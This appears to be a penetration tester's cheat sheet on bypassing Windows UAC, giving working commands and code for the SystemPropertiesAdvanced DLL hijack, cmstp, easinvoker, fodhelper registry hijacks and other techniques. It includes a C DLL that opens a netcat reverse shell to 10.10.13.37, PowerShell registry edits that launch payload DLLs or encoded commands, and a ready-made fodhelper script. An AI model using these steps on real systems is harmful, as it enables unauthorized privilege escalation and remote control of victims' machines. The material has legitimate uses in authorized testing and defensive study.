# UAC Bypass

## Enumeration

Check current token privileges and UAC settings with Seatbelt:

```
PS > .\Seatbelt.exe TokenPrivileges UAC
```

## SystemPropertiesAdvanced.exe

`srrstr.dll` DLL hijacking.

* [https://egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)

{% code title="srrstr.c" %}
```c
// i686-w64-mingw32-g++ srrstr.c -lws2_32 -o srrstr.dll -shared

#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
	switch(dwReason) {
		case DLL_PROCESS_ATTACH:
			WinExec("C:\\Users\\<USERNAME>\\Documents\\nc.exe 10.10.13.37 1337 -e powershell", 0);
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
	}

	return 0;
}
```
{% endcode %}

Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\` and check it:

```
PS > rundll32.exe srrstr.dll,xyz
```

Exec and get a shell ("requires an interactive window station"):

```
PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## cmstp.exe

* [0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
* [https://gist.github.com/snovvcrash/56d51e535c3afd89a1e9e68c284553a6](https://gist.github.com/snovvcrash/56d51e535c3afd89a1e9e68c284553a6)

Compile from source, load and execute:

```
PS > Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
PS > [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
PS > [CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
```

Load from a weaponized PowerShell and execute:

```
PS > Bypass-UAC -C "C:\Windows\System32\cmd.exe"
```

## easinvoker.exe

* [https://github.com/sailay1996/UAC\_Bypass\_In\_The\_Wild/tree/master/FileSys\_UAC\_Bypass/uac\_easinvoker](https://github.com/sailay1996/UAC\_Bypass\_In\_The\_Wild/tree/master/FileSys\_UAC\_Bypass/uac\_easinvoker)
* [https://github.com/g3tsyst3m/elevationstation/blob/main/elevationstation/elevationstation.cpp](https://github.com/g3tsyst3m/elevationstation/blob/ba521d9901c98458526c1790b2b0ed0b370796bc/elevationstation/elevationstation.cpp#L895-L903)

```
mkdir "\\?\C:\Windows "
mkdir "\\?\C:\Windows \System32"
copy c:\windows\system32\easinvoker.exe "C:\Windows \System32"
copy netutils.dll "C:\Windows \System32"
"C:\Windows \System32\easinvoker.exe"
del /q "C:\Windows \System32\*"
rmdir "C:\Windows \System32"
rmdir "C:\Windows "
```

## fodhelper.exe

* [https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692](https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692)

Create and set registry values (the payload is generated with [`charlotte.py`](broken-reference)):

```
PS > New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
PS > New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
PS > Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "rundll32 C:\Windows\System32\spool\drivers\color\met.dll, SUJIzDKv" -Force
```

Trigger `fodhelper.exe`:

```
PS > Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

Clean up:

```
PS > Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

Another way to do it with a script (hijacking PowerShell executable):

{% code title="fod.ps1" %}
```powershell
function Fod {
    $cmd = "C:\Windows\Tasks\foo.exe -enc <BASE64_CMD>"
	
    copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\foo.exe
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
	
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $cmd -Force
	
	Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -s 3
	
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
}
```
{% endcode %}

## SilentCleanup

* [https://hausec.com/2020/10/30/using-a-c-shellcode-runner-and-confuserex-to-bypass-uac-while-evading-av/](https://hausec.com/2020/10/30/using-a-c-shellcode-runner-and-confuserex-to-bypass-uac-while-evading-av/)
* [https://github.com/chryzsh/Aggressor-Scripts/tree/master/uac-bypass](https://github.com/chryzsh/Aggressor-Scripts/tree/master/uac-bypass)

## SCM UAC Bypass

* [https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html](https://www.tiraniddo.dev/2022/03/bypassing-uac-in-most-complex-way.html)
* [https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)
* [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

## Task Scheduler

* [https://www.zcgonvh.com/post/Advanced\_Windows\_Task\_Scheduler\_Playbook-Part.2\_from\_COM\_to\_UAC\_bypass\_and\_get\_SYSTEM\_dirtectly.html](https://www.zcgonvh.com/post/Advanced\_Windows\_Task\_Scheduler\_Playbook-Part.2\_from\_COM\_to\_UAC\_bypass\_and\_get\_SYSTEM\_dirtectly.html)
* [https://github.com/zcgonvh/TaskSchedulerMisc/blob/master/schuac.cs](https://github.com/zcgonvh/TaskSchedulerMisc/blob/master/schuac.cs)

## Tricks

Bypass UAC for file read/write:

```
Cmd > net use A: \\127.0.0.1\C$
Cmd > A:
Cmd > cd \Windows\System32
Cmd > echo test > test.txt
Cmd > dir test.txt
```
